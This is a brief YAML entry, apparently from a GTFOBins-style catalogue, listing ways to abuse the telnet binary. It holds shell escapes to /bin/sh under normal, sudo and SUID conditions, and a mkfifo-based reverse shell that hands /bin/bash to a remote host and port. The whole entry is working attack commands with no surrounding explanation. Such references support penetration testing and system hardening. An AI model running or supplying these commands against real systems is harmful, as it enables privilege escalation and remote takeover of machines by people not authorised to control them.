---
functions:
  exec-interactive:
    - code: |
        RHOST=www.google.com
        RPORT=80
        telnet $RHOST $RPORT
        ^]
        !/bin/sh
      description: MacOS only.
  reverse-shell:
    - code: |
        RHOST=127.0.0.1
        RPORT=8000
        TF=$(mktemp)
        rm $TF
        mkfifo $TF && telnet $RHOST $RPORT 0<$TF | /bin/bash 1>$TF
  sudo-enabled:
    - code: |
        RHOST=www.google.com
        RPORT=80
        sudo telnet $RHOST $RPORT
        ^]
        !/bin/sh
      description: MacOS only.
  suid-limited:
    - code: |
        RHOST=www.google.com
        RPORT=80
        ./telnet $RHOST $RPORT
        ^]
        !/bin/sh
      description: MacOS only.
---
